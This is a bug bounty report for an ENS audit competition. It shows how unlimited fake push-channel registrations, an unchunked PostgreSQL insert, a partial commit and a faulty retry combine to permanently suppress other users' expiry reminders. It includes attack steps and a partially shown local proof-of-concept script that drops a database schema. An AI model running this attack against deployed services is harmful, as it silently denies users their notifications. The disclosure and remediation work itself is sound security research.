# 90446 w a medium no per user push channel cap and faulty retry after a partial commit permanently suppress other users external expiry reminders

**Submitted on Aug 25th 2026 at 03:11:17 UTC by @IronsideSec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90446
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

An ordinary authenticated wallet can store invented push subscriptions with no application-level per-user cap, each immediately marked `verified`. During expiry ingestion, the Worker multiplies that stored cardinality across a cross-user event batch and sends every delivery row in one PostgreSQL statement. The attacker can make that statement exceed its two-byte Bind-parameter count. The Worker has already committed the victim's notification/idempotency row in a separate statement. On an ordinary retry containing only those committed events, `ON CONFLICT DO NOTHING ... RETURNING` yields no new notification, so the Worker acknowledges them without reconstructing the missing delivery; a mixed retry can instead exhaust without reconstruction. The victim's opted-in email, push, or Telegram expiry reminder is permanently suppressed with no victim interaction.

## Vulnerability Details

### Root cause and security boundary

The exploit combines five behaviors in the in-scope Worker:

1. authenticated users can create fake push channels with no application-level per-user cap, and every row becomes `verified`;
2. one user's channels are multiplied across every expiry event for which that user is a recipient;
3. a cross-user batch's complete delivery fanout is inserted in one unchunked SQL statement;
4. notification/idempotency rows commit before delivery/outbox rows, with no transaction; and
5. an idempotent retry treats an existing notification as proof that delivery work also exists.

PostgreSQL, Neon, and Cloudflare are not claimed to be vulnerable targets. A finite statement limit and queue retry are normal infrastructure behavior. The security bug is the Worker's attacker-controlled cardinality, attacker-sized cross-user query, partial commit, and incorrect retry invariant.

### Any authenticated wallet can create fake verified push channels with no per-user cap

The full public route is `POST /notifications/channels/push`: [`app/index.ts:14-22`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/index.ts#L14-L22), [`notifications/index.ts:29-32`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/index.ts#L29-L32), and [`channels/index.ts:23-56`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/index.ts#L23-L56).

[`push.ts:47-64`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/push.ts#L47-L64) requires an authenticated JWT, an allowlisted provider URL, and two arbitrary strings.

The allowlist is useful SSRF protection, but it does not prove provider issuance or valid Web Push keys; `https://fcm.googleapis.com/fcm/send/fake-0` passes.

The duplicate lookup is only for the same user's same endpoint at [`push.ts:70-77`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/push.ts#L70-L77). Every distinct invented path therefore reaches the insert and is immediately marked `verified` at [`push.ts:100-115`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/push.ts#L100-L115).

The schema only enforces uniqueness of `(user_id, channel, target)` at [`schema/notifications.ts:73-79`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/database/schema/notifications.ts#L73-L79). There is no per-user channel cap and no push-route rate limit.

The two PoC modes create either 219 or 10,922 distinct rows through the **full public Hono app**. The harness substitutes local token issuance, but the token passes the real JWT verification middleware and references a real foreign-key-backed attacker user row. Production source issues the same `user_id` and `address` claims after the intended wallet/SIWE login; the exploit does not require an authentication bypass.

### Favorites and normal expiry fanout multiply every stored channel

Any authenticated user can watch a public name through the intended [`PUT /favorites/:name`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/favorites/index.ts#L21-L36) route. The `7d`, `1d`, and `expired` stages all include favorite recipients at [`stages.ts:15-29`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/expiry-discovery/stages.ts#L15-L29). The embedded PoC also invokes the real `runExpiryDiscoveryCron` at three stage-relative times against an exact-loopback GraphQL/cursor fixture and captures genuine `7d`, `1d`, and `expired` queue bodies with `includeFavorites: true`. Deterministic mode feeds all three captured bodies to the consumer; configured-full-batch mode feeds the captured `7d` body plus 49 schema-equivalent local bodies.

For each consumer invocation, [`event-ingestion.ts:124-233`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L124-L233) resolves owner and favorite recipients and builds one notification per `(event, user)`. After inserting those notifications, it loads **all** verified channels belonging to the inserted users at [`event-ingestion.ts:275-315`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L275-L315).

The nested loop at [`event-ingestion.ts:331-390`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L331-L390) creates one delivery and provider job per supported channel of every notification.

The checked-in consumer permits 50 messages per invocation at [`wrangler.jsonc:77-80`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/wrangler.jsonc#L77-L80). The cron producer sends chunks of up to 100 at [`expiry-discovery/index.ts:18`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/expiry-discovery/index.ts#L18) and [`:109-123`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/services/expiry-discovery/index.ts#L109-L123). A full 50-message consumer batch is therefore a configured normal case.

In efficient mode:

* the attacker favorites all 50 names and has 219 verified push channels;
* one target name is owned by a victim with one verified email channel and owner-expiry delivery enabled; and
* the other 49 owners are not application users.

The Worker constructs:

```
50 attacker notifications × 219 attacker channels = 10,950
 1 victim notification   ×   1 victim channel       =      1
                                                        ------
                                                        10,951 delivery rows
```

This variant needs the 50 attacker-recipient events to share one permitted consumer invocation. It can poison any victim recipients who naturally share such a full batch; exact placement of one preselected victim is not guaranteed.

Deterministic mode removes that batching premise. With one event where the attacker is a favorite recipient and the victim is the owner:

```
10,922 attacker channels + 1 victim channel = 10,923 delivery rows
```

The PoC makes all 10,922 registrations through the authenticated public route and then repeats the one-event attack for `7d`, `1d`, and `expired`. Thus one stored setup can suppress all three favorite-enabled stages without consumer grouping.

### One unchunked delivery insert exceeds the Bind count and fails atomically

The Worker sends the entire array in one call at [`event-ingestion.ts:407-410`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L407-L410).

Every row supplies six bound values: `id`, `notification_id`, `channel`, `target`, `status`, and `attempts`. Therefore:

```
efficient full batch: 10,951 × 6 = 65,706 parameters
one-event variant:    10,923 × 6 = 65,538 parameters
```

PostgreSQL's extended-query Bind message uses a two-byte count for parameter values. Even if every bit pattern is treated as non-negative, 65,535 is the absolute maximum; neither statement's count is representable. The exact statement fails before inserting any delivery row.

This is not a SQLite or query-builder assumption. [`core/database/index.ts:1-23`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/database/index.ts#L1-L23) uses `@neondatabase/serverless` and `drizzle-orm/neon-http`, while [`drizzle.config.ts:10-17`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/drizzle.config.ts#L10-L17) declares PostgreSQL.

Both modes execute the full app, producer, consumer, product `getDatabase()`, and installed Neon client. A disclosed loopback Neon-JSON-to-`node-postgres` adapter runs each emitted statement against real disposable PostgreSQL 17. The local 65,706-value path returns:

```
08P01: bind message has 170 parameter formats but 0 parameters
```

The exact text and wrapped `170` are local-path-specific, not deployed-Neon observations. The installed client emits one unsplit 65,706-parameter/approximately 2.71 MB request; it fails atomically after 51 notification rows committed. Earlier or different proxy rejection reaches the same caught-error/retry path.

Corroboration only: pinned official Neon source deserializes `params` as one vector at [`sql_over_http.rs:44-53`](https://github.com/neondatabase/neon/blob/8f60b04da47ffefe0e52bda2440134b42874eb75/proxy/src/serverless/sql_over_http.rs#L44-L53) and passes it directly to `query_raw_txt` at [`:868-881`](https://github.com/neondatabase/neon/blob/8f60b04da47ffefe0e52bda2440134b42874eb75/proxy/src/serverless/sql_over_http.rs#L868-L881). This is not a deployment attestation or third-party vulnerability claim.

### The notification/idempotency rows commit before the delivery statement

The notification insert, including `ON CONFLICT DO NOTHING ... RETURNING`, occurs first at [`event-ingestion.ts:249-262`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L249-L262).

Only after that awaited statement succeeds does the Worker load channels, build deliveries, and issue the failing statement. The calls are not enclosed in `db.transaction(...)`. Each Neon HTTP statement therefore commits independently. The first attempt leaves the victim's notification and globally unique idempotency key in [`notifications`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/database/schema/notifications.ts#L164-L191), while the all-or-nothing delivery insert leaves no victim or attacker delivery row.

The real-PostgreSQL integration observes this exact partial state; the failure is no longer injected by a database double.

### Retry mistakes the partial commit for completed delivery and skips reconstruction

When processing fails, [`handleEventIngestionQueue`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L586-L605) requests retry for every valid message.

On retry, every old notification conflicts with the first attempt. `ON CONFLICT DO NOTHING ... RETURNING` returns no row. [`processExpiryEvents` at lines 268-272](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L268-L272) incorrectly returns success when `insertedNotifications.length === 0`.

It neither loads existing notification IDs nor creates missing delivery/outbox rows. The successful result makes the outer handler acknowledge every valid message at [`event-ingestion.ts:608-610`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L608-L610).

Cloudflare does not have to preserve the original retry batch. Efficient mode deliberately splits the 50 retried messages into batches of 17 and 33 while retaining their original message IDs and incrementing `attempts`. Both real notification inserts return zero rows, both subsets are acknowledged, and the delivery statement is never retried. If old retries are mixed with fresh events, only the fresh rows returned by `RETURNING` receive fanout; the conflicted victim rows still are not reconstructed. The mixed invocation can acknowledge the old messages if its new work succeeds, or retry/exhaust them if new attacker fanout fails again, but neither schedule repairs the missing victim delivery.

There is no scheduled scan elsewhere in the Worker that converts notification rows with missing deliveries into provider work. The terminal state is:

| Record/action                              | State after retry                                                                                                 |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------- |
| Victim in-app notification/idempotency row | Present                                                                                                           |
| Victim external delivery row               | Missing                                                                                                           |
| Victim email/push/Telegram provider job    | Missing                                                                                                           |
| Event queue message                        | Acknowledged in the demonstrated split-retry schedule; otherwise acknowledged or exhausted without reconstruction |
| Later automatic reconstruction             | None                                                                                                              |

### End-to-end attack path

{% stepper %}
{% step %}

## Sign in normally

The attacker signs in normally with their own wallet.
{% endstep %}

{% step %}

## Create fake verified push channels

They submit distinct short provider-looking paths to `POST /notifications/channels/push`. Each row becomes `verified`. The efficient form uses 219 registrations; the batching-independent form uses 10,922.
{% endstep %}

{% step %}

## Enable favorite expiry delivery

They enable favorite expiry delivery and favorite public names entering a `7d`, `1d`, or `expired` producer window.
{% endstep %}

{% step %}

## Wait for an affected expiry invocation

An expiry invocation contains both an attacker-recipient event and at least one opted-in victim recipient. No victim action or knowledge of the victim's external target is needed.
{% endstep %}

{% step %}

## Commit notification/idempotency rows

The Worker commits notification/idempotency rows.
{% endstep %}

{% step %}

## Cause the delivery insert to fail

Attacker-controlled fanout makes the single delivery statement unrepresentable, so it fails atomically and the Worker retries the valid messages.
{% endstep %}

{% step %}

## Exploit retry handling

In the demonstrated split-retry schedule, each retry conflicts with the committed notification rows, returns success before reconstructing delivery work, and acknowledges the messages. If mixed with fresh poisoned work, it can instead retry/exhaust without reconstruction.
{% endstep %}

{% step %}

## Suppress the external reminder

The victim never receives the configured external reminder. The same stored one-event setup can repeat this for `7d`, `1d`, and `expired` because no failed push job exists to unsubscribe the attacker's fake channels.
{% endstep %}
{% endstepper %}

### Practicality and the DDoS exclusion

The efficient demonstrated setup is 270 small authenticated state changes: 219 channels, 50 favorites, and one preference update. It can finish before the scheduled event. No concurrency or traffic is required when impact occurs, and the site remains online.

The one-event form uses 10,924 small state changes (10,922 channels, one favorite, and one preference update), all accepted by the real route. Setup can be spread over the [normal seven-day bearer lifetime](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/core/auth/jwt.ts#L6-L7) because there is no application cap or push-route rate limit. This larger variant is supplied only to remove consumer-batching uncertainty; the configured full-batch form is much cheaper.

This is not an impact that only requires DDoS:

* the trigger is persistent attacker-owned application state, not a packet or concurrency flood;
* no sustained traffic is needed at impact time;
* the API and website remain available;
* the consequence is a cross-user partial-commit/idempotency state transition; and
* stopping all attacker traffic does not reconstruct a victim delivery after acknowledgment or retry exhaustion.

The PoC runs make no requests to deployed ENS, Neon, Cloudflare, indexer, or provider services. They exercise the installed Neon client, product Cloudflare handler interfaces, full local Hono app, and real PostgreSQL; all substituted HTTP and database transport is exact-loopback-only.

### Distinct from supplied public known issues

No supplied issue covers this channel-cardinality/partial-commit/retry root. **EXP-INPUT-009** requires a delivered/clicked Manager push; **R2-05** is SendGrid webhook verification; **R3-07** is transaction-manager history/telemetry idempotency; and **WEB-1148** is a Manager UI loop. None uses this route, state, or lost server-side outbox work.

### Recommended remediation

{% stepper %}
{% step %}

## Enforce channel limits and validation

Enforce a small per-user push-channel cap and validate Web Push key encodings/provider endpoint shape before marking a channel verified.
{% endstep %}

{% step %}

## Chunk delivery inserts

Chunk delivery inserts well below every database/transport limit.
{% endstep %}

{% step %}

## Use atomic commits

Atomically commit notifications and delivery/outbox rows in one transaction or transactional database procedure.
{% endstep %}

{% step %}

## Reconstruct missing work on retries

On idempotent retry, load existing notification IDs and upsert any missing delivery/outbox rows instead of returning early. Add a uniqueness constraint suitable for safe delivery upserts.
{% endstep %}

{% step %}

## Bound recipient fanout

Bound or isolate fanout per recipient so one user's stored cardinality cannot fail a cross-user batch.
{% endstep %}

{% step %}

## Add regression tests

Add regression tests for partial commits, retry rebatching, and a clean-baseline-versus-poisoned delivery outcome.
{% endstep %}
{% endstepper %}

## Impact Details

The exact selected in-scope impact is:

> **Medium — “Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications.”**

The attacker causes a terminal server state: the victim notification is marked/idempotent, but its external delivery/outbox work is absent and the demonstrated retry is acknowledged. The clean control instead creates one notification, one email delivery, and one email job. This is effective per-event disabling, not delay/provider failure; it does not claim `user_notification_settings` mutation.

Deterministic mode proves this for `7d`, `1d`, and `expired`: all first delivery statements fail, retries return zero notification rows, and the victim ends with three in-app rows but **zero external delivery rows/jobs**. Production supports email, Telegram, and push for `name-expiry` at [`name-expiry.ts:22-25`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/shared-schema/src/notifications/kinds/name-expiry.ts#L22-L25); email is directly proved and all channels share the failed insert.

The victim never clicks, signs, connects, or reveals a channel target. Their preference and in-app row remain; this report does not claim a settings mutation, outage, name loss, or funds loss. It claims permanent unauthorized suppression of affected external reminders.

## References

* [Push-channel route](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/app/routes/notifications/channels/push.ts#L41-L129)
* [Expiry consumer, fanout, and retry](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/workers/api-worker/src/queues/event-ingestion.ts#L108-L619)
* [Official Neon proxy parameter-vector forwarding (corroboration only)](https://github.com/neondatabase/neon/blob/8f60b04da47ffefe0e52bda2440134b42874eb75/proxy/src/serverless/sql_over_http.rs#L868-L881)
* [PostgreSQL 17 Bind format](https://www.postgresql.org/docs/17/protocol-message-formats.html#PROTOCOL-MESSAGE-FORMATS-BIND)

## Proof of Concept

The complete two-mode PoC is embedded below. **No ZIP or attachment is required.** It blocks non-loopback database/HTTP targets and redirects.

### Test boundaries and prerequisites

It runs real PostgreSQL 17/tables/FKs, product Neon/Drizzle database code, full Hono routes/JWT middleware, `runExpiryDiscoveryCron`, and the real consumer/retry/dispatch logic. Local substitutes are token issuance, a minimal schema whose `uuid_generate_v7()` compatibility function returns UUIDv4 (version/order is irrelevant), loopback GraphQL/KV and Neon-to-`node-postgres` adapters, message/queue recorders, and logging. Efficient mode adds 49 equivalent bodies to one captured `7d` body; deterministic mode feeds all three captured stages.

The exact `08P01` text is local-`node-postgres`-path-specific, not a deployed-Neon observation.

Use Node.js 22, frozen dependencies, and PostgreSQL 17 tools. Save the block as `audit_workspace/pocs/lead-011/postgres-neon-complete-poc.mjs`; run from the repo root. Default mode creates/removes a loopback cluster. Destructive manual mode requires a literal `127.0.0.1`/`::1` URL without query/fragment, `LEAD011_ALLOW_DROP_PUBLIC=1`, and major 17 before `DROP`; credential/hostname/query tricks fail before connection.

### Complete source

```js
/* LEAD-011 local-only PoC. Default: disposable loopback PostgreSQL 17.
 * Manual database mode drops public and is guarded below. No deployed-service requests. */
import { spawnSync } from 'node:child_process'
import { createRequire } from 'node:module'
import { accessSync, constants, mkdirSync, mkdtempSync, rmSync, writeSync } from 'node:fs'
import { createServer } from 'node:net'
import { tmpdir } from 'node:os'
import { delimiter, join } from 'node:path'

// Run from the frozen repository root; the embedded report gives this exact command.
const workerDir = join(process.cwd(), 'workers/api-worker')
const workerRequire = createRequire(join(workerDir, 'package.json'))
// drizzle-kit is a direct frozen workspace dependency and exposes its pinned tsx runtime.
const tsxLoader = createRequire(workerRequire.resolve('drizzle-kit')).resolve('tsx')
const source = `import assert from 'node:assert/strict'
import { mock } from 'node:test'
import { createServer as createHttpServer } from 'node:http'
import pg from 'pg'
import { neonConfig } from '@neondatabase/serverless'
import { sign } from 'hono/jwt'

const pgUrl = process.env.LEAD011_PG_URL
assert.ok(pgUrl, 'Set LEAD011_PG_URL to a disposable local PostgreSQL 17 database')
const parsedPgUrl = new URL(pgUrl)
assert.ok(['postgres:', 'postgresql:'].includes(parsedPgUrl.protocol), 'Safety: PostgreSQL URL required')
assert.ok(
  ['127.0.0.1', '::1', '[::1]'].includes(parsedPgUrl.hostname.toLowerCase()),
  'Safety: exact loopback PostgreSQL IP literal required, got ' + parsedPgUrl.hostname,
)
assert.equal(parsedPgUrl.search, '', 'Safety: connection-string query overrides are not allowed')
assert.equal(parsedPgUrl.hash, '', 'Safety: connection-string fragments are not allowed')

const nativeFetch = globalThis.fetch
assert.equal(typeof nativeFetch, 'function')
globalThis.fetch = async (input, init) => {
  const requestUrl = new URL(input instanceof Request ? input.url : String(input))
  assert.ok(
    ['127.0.0.1', '::1', '[::1]'].includes(requestUrl.hostname.toLowerCase()),
    'Safety: unexpected non-loopback HTTP request blocked: ' + requestUrl.href,
  )
  // Do not let native fetch follow a loopback server's redirect to a remote URL.
  const response = await nativeFetch(input, { ...init, redirect: 'error' })
  const responseUrl = new URL(response.url)
  assert.ok(
    ['127.0.0.1', '::1', '[::1]'].includes(responseUrl.hostname.toLowerCase()),
    'Safety: unexpected non-loopback HTTP response blocked: ' + responseUrl.href,
  )
  return response
}

const actualDb = await import('./src/core/database/index.ts')
const { TABLE, schema } = actualDb
const pool = new pg.Pool({ connectionString: pgUrl, max: 1 })

const ATTACKER_ID = 'aaaaaaaa-aaaa-7aaa-8aaa-aaaaaaaaaaaa'
const VICTIM_ID = 'bbbbbbbb-bbbb-7bbb-8bbb-bbbbbbbbbbbb'
const ATTACKER_ADDRESS = '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
const VICTIM_ADDRESS = '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
const UNREGISTERED_OWNER_ADDRESS = '0xcccccccccccccccccccccccccccccccccccccccc'
const MODE = process.env.LEAD011_MODE || 'deterministic'
assert.ok(['deterministic', 'efficient'].includes(MODE), 'LEAD011_MODE must be deterministic or efficient')
const CHANNEL_COUNT = MODE === 'efficient' ? 219 : 10_922
const EVENT_COUNT = MODE === 'efficient' ? 50 : 1
const POISONED_STAGES = MODE === 'efficient' ? ['7d'] : ['7d', '1d', 'expired']
const NOTIFICATION_ROWS_PER_STAGE = MODE === 'efficient' ? 51 : 2
const DELIVERY_ROWS_PER_STAGE = MODE === 'efficient' ? 10_951 : 10_923
const BIND_PARAMETERS_PER_STAGE = DELIVERY_ROWS_PER_STAGE * 6

const schemaSql = \`
DROP SCHEMA public CASCADE;
CREATE SCHEMA public;
CREATE FUNCTION uuid_generate_v7() RETURNS uuid
  LANGUAGE sql VOLATILE AS $$ SELECT gen_random_uuid() $$;
CREATE TABLE users (
  id uuid PRIMARY KEY DEFAULT uuid_generate_v7(),
  address text NOT NULL UNIQUE
);
CREATE TABLE favorites (
  name text NOT NULL,
  user_id uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  created_at timestamptz DEFAULT now() NOT NULL,
  PRIMARY KEY(user_id, name)
);
CREATE TABLE user_channels (
  id uuid PRIMARY KEY DEFAULT uuid_generate_v7(),
  user_id uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  channel text NOT NULL,
  target text,
  data jsonb,
  verified_at timestamptz,
  status text NOT NULL,
  status_reason text,
  last_sent_at timestamptz,
  last_bounce_at timestamptz,
  last_verification_sent_at timestamptz,
  verification_attempts integer DEFAULT 0,
  UNIQUE(user_id, channel, target)
);
CREATE TABLE user_notification_settings (
  user_id uuid PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
  owned_name_expiry boolean DEFAULT false NOT NULL,
  favourited_name_expiry boolean DEFAULT false NOT NULL,
  ens_labs_updates boolean DEFAULT false NOT NULL,
  updated_at timestamptz DEFAULT now()
);
CREATE TABLE notifications (
  id uuid PRIMARY KEY DEFAULT uuid_generate_v7(),
  user_id uuid NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  kind text NOT NULL,
  payload jsonb,
  created_at timestamptz DEFAULT now() NOT NULL,
  read_at timestamptz,
  archived_at timestamptz,
  idempotency_key text NOT NULL UNIQUE
);
CREATE TABLE notification_deliveries (
  id uuid PRIMARY KEY DEFAULT uuid_generate_v7(),
  notification_id uuid NOT NULL REFERENCES notifications(id) ON DELETE CASCADE,
  channel text NOT NULL,
  target text NOT NULL,
  status text NOT NULL,
  attempts integer DEFAULT 0,
  provider_msg_id text,
  error text,
  failure_category text,
  dlq_attempts integer DEFAULT 0,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);
\`

const serverVersionResult = await pool.query('show server_version')
const serverVersion = serverVersionResult.rows[0].server_version
assert.match(serverVersion, /^17\\./, \`Expected PostgreSQL 17, got \${serverVersion}\`)
await pool.query(schemaSql)
await pool.query(
  'insert into users(id, address) values ($1, $2), ($3, $4)',
  [ATTACKER_ID, ATTACKER_ADDRESS, VICTIM_ID, VICTIM_ADDRESS],
)
await pool.query(
  \`insert into user_channels(id, user_id, channel, target, data, verified_at, status)
   values ('11111111-1111-7111-8111-111111111111', $1, 'email', 'victim@example.com', null, now(), 'verified')\`,
  [VICTIM_ID],
)
await pool.query(
  \`insert into user_notification_settings
   (user_id, owned_name_expiry, favourited_name_expiry, ens_labs_updates)
   values ($1, true, false, false)\`,
  [VICTIM_ID],
)

const observedDbErrors = []
const observedRequests = []
const rawPgTypes = { getTypeParser: () => value => value }

// Local, fail-closed adapter for Neon's documented SQL-over-HTTP response shape.
// The product's installed Neon client still builds every request; this adapter
// only executes that request against the disposable local PostgreSQL server.
neonConfig.fetchFunction = async (_url, options) => {
  const requestBody = String(options?.body ?? '')
  const payload = JSON.parse(requestBody)
  assert.ok(payload.query, 'This PoC expects one SQL statement per Neon request')
  const statement = payload
  const observedRequest = {
    queryPrefix: statement.query.slice(0, 80),
    parameterCount: statement.params.length,
    bodyBytes: Buffer.byteLength(requestBody),
  }
  observedRequests.push(observedRequest)

  try {
    const result = await pool.query({
      text: statement.query,
      values: statement.params,
      rowMode: 'array',
      types: rawPgTypes,
    })
    observedRequest.rowCount = result.rowCount
    return new Response(JSON.stringify({
      command: result.command,
      rowCount: result.rowCount,
      rows: result.rows,
      fields: result.fields.map(field => ({
        name: field.name,
        dataTypeID: field.dataTypeID,
        tableID: field.tableID,
        columnID: field.columnID,
        dataTypeSize: field.dataTypeSize,
        dataTypeModifier: field.dataTypeModifier,
        format: 'text',
      })),
      rowAsArray: true,
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    })
  } catch (error) {
    observedDbErrors.push({
      code: error?.code,
      message: error?.message,
      parameterCount: statement.params.length,
      queryPrefix: statement.query.slice(0, 80),
    })
    return new Response(JSON.stringify({
      message: error?.message ?? String(error),
      code: error?.code,
      severity: error?.severity,
      detail: error?.detail,
      hint: error?.hint,
    }), {
      status: 400,
      headers: { 'Content-Type': 'application/json' },
    })
  }
}

await mock.module('#utils/logger.js', {
  namedExports: {
    logger: {
      trace() {}, debug() {}, info() {}, warn() {}, error() {},
      isLevelEnabled() { return false },
    },
  },
})

const { default: app } = await import('./src/app/index.ts')
const { handleEventIngestionQueue } = await import('./src/queues/event-ingestion.ts')
const { runExpiryDiscoveryCron } = await import('./src/services/expiry-discovery/index.ts')


async function captureFavoriteProducerEvents({ name, expiryDate, owner }) {
  let graphqlRequests = 0
  const server = createHttpServer(async (request, response) => {
    try {
      let body = ''
      for await (const chunk of request) body += chunk
      const payload = JSON.parse(body)
      const cursor = Number(payload.variables.cursor)
      const upperBound = Number(payload.variables.upper_bound)
      const inWindow = cursor < expiryDate && expiryDate <= upperBound
      graphqlRequests++
      response.writeHead(200, { 'Content-Type': 'application/json' })
      response.end(JSON.stringify({
        data: {
          domains: inWindow ? [{ name, expiryDate, owner: { id: owner } }] : [],
        },
      }))
    } catch (error) {
      response.writeHead(500, { 'Content-Type': 'application/json' })
      response.end(JSON.stringify({ errors: [{ message: String(error) }] }))
    }
  })
  await new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', resolve)
  })
  const address = server.address()
  assert.ok(address && typeof address === 'object')
  const indexerUrl = 'http://127.0.0.1:' + address.port + '/graphql'
  const realDateNow = Date.now
  const captured = []
  const stageOffsets = { '30d': 30, '7d': 7, '1d': 1, expired: 0 }
  const targetStages = ['7d', '1d', 'expired']

  try {
    for (const targetStage of targetStages) {
      const nowSec = expiryDate - stageOffsets[targetStage] * 24 * 60 * 60
      Date.now = () => nowSec * 1000
      const cursors = Object.fromEntries(
        Object.entries(stageOffsets).map(([stage, offsetDays]) => {
          const upperBound = stage === 'expired'
            ? nowSec
            : nowSec + offsetDays * 24 * 60 * 60
          return [stage, { expiry_timestamp: upperBound - 1 }]
        }),
      )
      const producerEnv = {
        ENS_INDEXER_GRAPHQL_URL: indexerUrl,
        KV: {
          get: async (_key, type) => {
            assert.equal(type, 'json')
            return structuredClone(cursors)
          },
          put: async () => {},
        },
        EVENT_INGESTION_QUEUE: {
          sendBatch: async entries => captured.push(...entries.map(entry => entry.body)),
        },
      }
      const result = await runExpiryDiscoveryCron(producerEnv)
      assert.ok(result.isOk(), 'Real expiry producer must succeed: ' + String(result.error))
      assert.deepEqual(result.value, { totalEnqueued: 1, failedStages: 0 })
    }
  } finally {
    Date.now = realDateNow
    await new Promise((resolve, reject) => server.close(error => error ? reject(error) : resolve()))
  }

  assert.deepEqual(captured.map(event => event.stage), targetStages)
  assert.ok(captured.every(event => event.name === name && event.expiryDate === expiryDate))
  assert.ok(captured.every(event => event.owner === owner.toLowerCase() && event.includeFavorites === true))
  assert.equal(graphqlRequests, targetStages.length * 4)
  return { events: captured, graphqlRequests }
}

let queueSendCount = 0
const env = {
  DATABASE_URL: 'postgresql://local:local@db.localtest.me/local',
  JWT_SECRET: 'local-secret',
  EMAIL_QUEUE: { sendBatch: async () => { queueSendCount++ } },
  PUSH_QUEUE: { sendBatch: async () => { queueSendCount++ } },
  TELEGRAM_QUEUE: { sendBatch: async () => { queueSendCount++ } },
}
const producerCapture = await captureFavoriteProducerEvents({
  name: 'batch-0.eth',
  expiryDate: 1_800_000_000,
  owner: VICTIM_ADDRESS,
})
const producerEventByStage = new Map(producerCapture.events.map(event => [event.stage, event]))
const jwt = await sign({
  user_id: ATTACKER_ID,
  address: ATTACKER_ADDRESS,
  exp: Math.floor(Date.now() / 1000) + 3600,
}, env.JWT_SECRET, 'HS256')
const authHeaders = {
  Authorization: \`Bearer \${jwt}\`,
  'Content-Type': 'application/json',
}

// Clean baseline control: the same victim, channel, preference, and target event
// create one email delivery/job before attacker fanout exists. Reset only the
// disposable fixture rows, then replay that target in the poisoned batch.
const baselineCounters = { ack: 0, retry: 0 }
